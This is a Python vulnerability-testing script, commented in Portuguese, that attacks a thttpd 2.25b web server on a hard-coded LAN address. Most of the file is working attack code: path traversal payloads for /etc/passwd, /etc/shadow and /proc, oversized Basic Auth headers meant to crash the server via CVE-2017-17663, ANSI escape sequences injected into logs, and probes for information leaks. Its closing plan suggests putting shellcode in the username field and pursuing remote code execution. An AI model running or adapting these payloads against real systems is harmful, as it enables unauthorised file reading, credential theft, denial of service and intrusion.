#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
thttpd-2.25b Vulnerability Tester
Target: 192.168.1.254:443 (HTTPS)
Binário: thttpd/2.25b 29dec2003 (MIPS32 BE, uClibc, sem proteções)

Testa:
  1. Path Traversal (LFI) via expand_symlinks() / de_dotdot()
  2. CVE-2017-17663 — htpasswd / auth_check buffer overflow (Basic Auth longo)
  3. CVE-2009-4491 — ANSI escape sequences em logs (User-Agent malicioso)

Uso:
  python3 thttpd_vuln_tester.py
"""

import sys
import socket
import ssl
import time
import base64

TARGET = "192.168.1.254"
PORT = 443
TIMEOUT = 10

# Desabilitar warnings de certificado SSL inválido
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def banner():
    print("=" * 70)
    print("  thttpd 2.25b Vulnerability Tester")
    print(f"  Target: {TARGET}:{PORT}")
    print("=" * 70)
    print()


def send_https_request(path, headers=None, method="GET", body=None):
    """Envia um request HTTPS raw e retorna (status, headers, body)"""
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    try:
        sock = socket.create_connection((TARGET, PORT), timeout=TIMEOUT)
        ssock = context.wrap_socket(sock, server_hostname=TARGET)

        req_line = f"{method} {path} HTTP/1.0\r\n"
        req_headers = f"Host: {TARGET}\r\n"
        if headers:
            for k, v in headers.items():
                req_headers += f"{k}: {v}\r\n"
        req_headers += "Connection: close\r\n"
        if body:
            req_headers += f"Content-Length: {len(body)}\r\n"
        req_headers += "\r\n"

        request = req_line + req_headers
        if body:
            request += body

        ssock.sendall(request.encode('latin-1'))

        response = b""
        while True:
            chunk = ssock.recv(4096)
            if not chunk:
                break
            response += chunk

        ssock.close()

        # Parse response
        header_end = response.find(b"\r\n\r\n")
        if header_end == -1:
            header_end = response.find(b"\n\n")
            sep = 2
        else:
            sep = 4

        headers_raw = response[:header_end].decode('latin-1', errors='replace')
        body_raw = response[header_end + sep:]

        status_line = headers_raw.split("\r\n")[0]
        status_code = 0
        if " " in status_line:
            try:
                status_code = int(status_line.split(" ")[1])
            except:
                pass

        return status_code, headers_raw, body_raw

    except Exception as e:
        return -1, str(e), b""


def test_path_traversal():
    """Testa path traversal / LFI via expand_symlinks() / de_dotdot()"""
    print("[+] Teste 1: Path Traversal (LFI)")
    print("-" * 50)

    payloads = [
        # Clássicos
        "/....//....//etc/passwd",
        "/....//....//etc/shadow",
        "/....//....//proc/version",
        "/....//....//proc/self/cmdline",
        "/....//....//tmp/thttpd.log",
        "/....//....//var/log/thttpd.log",
        "/....//....//etc/hosts",
        "/....//....//etc/hostname",

        # URL-encoded
        "/..%2f..%2fetc%2fpasswd",
        "/..%2f..%2f..%2fetc%2fpasswd",
        "/%2e%2e/%2e%2e/etc/passwd",

        # Null-byte injection (se o parser não truncar)
        "/.%00./etc/passwd",
        "/..%00/../etc/passwd",

        # Double-dot variants
        "/.../.../etc/passwd",
        "/....\....\etc\passwd",
        "/..../etc/passwd",

        # Com query string
        "/index.cgi?....//....//etc/passwd",
        "/index.html?....//....//etc/passwd",

        # Com pathinfo CGI-style
        "/cgi-bin/....//....//etc/passwd",
    ]

    found = []
    for payload in payloads:
        status, headers, body = send_https_request(payload)
        body_str = body.decode('latin-1', errors='replace')[:500]

        indicator = None
        if status == 200:
            if "root:" in body_str or "daemon:" in body_str or "bin:" in body_str:
                indicator = "✅ LFI CONFIRMADO — /etc/passwd lido!"
            elif "Linux version" in body_str or "cmdline" in body_str:
                indicator = "✅ LFI CONFIRMADO — /proc lido!"
            else:
                indicator = "⚠️  Status 200 — verificar conteúdo"
        elif status == 403:
            indicator = "🔒 403 Forbidden — path reconhecido mas bloqueado"
        elif status == 404:
            indicator = "❌ 404 — não encontrado"
        elif status == -1:
            indicator = f"💥 Erro de conexão"
        else:
            indicator = f"📡 Status {status}"

        print(f"  {payload:50s} → {indicator}")

        if "CONFIRMADO" in indicator:
            found.append((payload, status, body_str))

    print()
    if found:
        print(f"[+] {len(found)} vetor(es) de path traversal funcionando!")
        for p, s, b in found:
            print(f"    Payload: {p}")
            print(f"    Primeiros 200 chars do body:")
            print(f"    {b[:200]}")
            print()
    else:
        print("[-] Nenhum path traversal confirmado nesta rodada.")
        print("    Tente ajustar payloads ou verificar se há WAF/frontend.")
    print()
    return found


def test_auth_overflow():
    """Testa CVE-2017-17663 — buffer overflow via Basic Auth longo"""
    print("[+] Teste 2: CVE-2017-17663 — htpasswd / auth_check Overflow")
    print("-" * 50)

    # Criar credenciais extremamente longas
    # O buffer em auth_check usa httpd_realloc_str, mas o parsing
    # do header Authorization pode ter caminhos vulneráveis
    long_user = "A" * 1024
    long_pass = "B" * 2048
    combined = f"{long_user}:{long_pass}"
    auth_b64 = base64.b64encode(combined.encode()).decode()

    payloads = [
        ("Basic Auth 1KB user", {"Authorization": f"Basic {base64.b64encode(b'A'*1024 + b':x').decode()}"}),
        ("Basic Auth 2KB user", {"Authorization": f"Basic {base64.b64encode(b'A'*2048 + b':x').decode()}"}),
        ("Basic Auth 4KB user", {"Authorization": f"Basic {base64.b64encode(b'A'*4096 + b':x').decode()}"}),
        ("Basic Auth 8KB combined", {"Authorization": f"Basic {base64.b64encode(b'A'*8192).decode()}"}),
        ("Basic Auth 16KB combined", {"Authorization": f"Basic {base64.b64encode(b'A'*16384).decode()}"}),
    ]

    results = []
    for name, headers in payloads:
        print(f"  Testando: {name}...", end=" ", flush=True)
        status, hdrs, body = send_https_request("/", headers=headers)
        body_str = body.decode('latin-1', errors='replace')[:200]

        if status == -1:
            print(f"💥 CONEXÃO DROPADA / CRASH!")
            results.append((name, "CRASH/DROP", body_str))
        elif status == 500 or "Internal Error" in body_str:
            print(f"⚠️  500 Internal Error — possível corrupção")
            results.append((name, "500 ERROR", body_str))
        elif status == 401:
            print(f"🔒 401 Unauthorized (esperado)")
            results.append((name, "401", body_str))
        else:
            print(f"📡 Status {status}")
            results.append((name, str(status), body_str))

        time.sleep(0.5)

    print()
    crashes = [r for r in results if "CRASH" in r[1] or "500" in r[1]]
    if crashes:
        print(f"[+] {len(crashes)} teste(s) causaram comportamento anômalo:")
        for name, res, body in crashes:
            print(f"    {name}: {res}")
    else:
        print("[-] Nenhum crash ou erro interno detectado.")
        print("    O overflow pode requerer interação com arquivo .htpasswd existente.")
    print()
    return results


def test_ansi_escape_logs():
    """Testa CVE-2009-4491 — ANSI escape sequences em logs"""
    print("[+] Teste 3: CVE-2009-4491 — ANSI Escape Sequences em Logs")
    print("-" * 50)

    # Sequências ANSI que manipulam título de terminal
    # Se o admin ler os logs em terminal vulnerável, o título muda
    payloads = [
        ("Title manipulation", "\x1b]0;OWNED\x07"),
        ("Clear screen", "\x1b[2J\x1b[H"),
        ("Red text", "\x1b[31mRED\x1b[0m"),
        ("Bell + title", "\x07\x1b]0;PWNED\x07"),
        ("Cursor hide", "\x1b[?25l"),
    ]

    for name, escape in payloads:
        ua = f"Mozilla/5.0 {escape}"
        print(f"  Enviando: {name}...", end=" ", flush=True)
        status, hdrs, body = send_https_request("/", headers={"User-Agent": ua})
        print(f"Status {status}")
        time.sleep(0.3)

    print()
    print("[+] Payloads enviados. Se o admin visualizar logs em terminal")
    print("    vulnerável (xterm, gnome-terminal, etc.), o título/cor será")
    print("    manipulado. Isso também pode ser usado para exfiltrar dados")
    print("    via DNS em alguns terminais vulneráveis.")
    print()


def test_info_leak():
    """Tenta extrair informações do servidor via headers e erros"""
    print("[+] Teste 4: Information Leakage")
    print("-" * 50)

    tests = [
        ("/", {}),
        ("/nonexistent", {}),
        ("/", {"Host": "\x00"}),
        ("/", {"Range": "bytes=0-"}),
        ("/", {"If-Modified-Since": "Sun, 06 Nov 1994 08:49:37 GMT"}),
    ]

    for path, headers in tests:
        status, hdrs, body = send_https_request(path, headers=headers)
        print(f"  {path:30s} Status: {status}")
        # Procurar por Server header
        for line in hdrs.split("\r\n"):
            if line.lower().startswith("server:"):
                print(f"    → {line}")
        time.sleep(0.2)

    print()


def main():
    banner()

    print("[*] Verificando conectividade...")
    status, hdrs, body = send_https_request("/")
    if status == -1:
        print(f"[FATAL] Não foi possível conectar em {TARGET}:{PORT}")
        print(f"        Erro: {hdrs}")
        sys.exit(1)

    print(f"[+] Conectado! Status inicial: {status}")
    for line in hdrs.split("\r\n"):
        if line.lower().startswith("server:"):
            print(f"    Server: {line}")
    print()

    # Rodar todos os testes
    lfi_results = test_path_traversal()
    auth_results = test_auth_overflow()
    test_ansi_escape_logs()
    test_info_leak()

    # Summary
    print("=" * 70)
    print("  RESUMO")
    print("=" * 70)
    print(f"  Path Traversal (LFI):  {len(lfi_results)} confirmado(s)")
    crashes = [r for r in auth_results if "CRASH" in r[1] or "500" in r[1]]
    print(f"  Auth Overflow:         {len(crashes)} anomalia(s)")
    print(f"  ANSI Escapes:          Enviados (verificar logs localmente)")
    print()
    print("  Próximos passos:")
    print("  1. Se LFI funcionou, extrair /etc/passwd, /proc/self/cmdline")
    print("  2. Se auth causou crash, tentar com shellcode no campo user")
    print("  3. Verificar se há CGI habilitado para RCE via env injection")
    print("=" * 70)


if __name__ == "__main__":
    main()
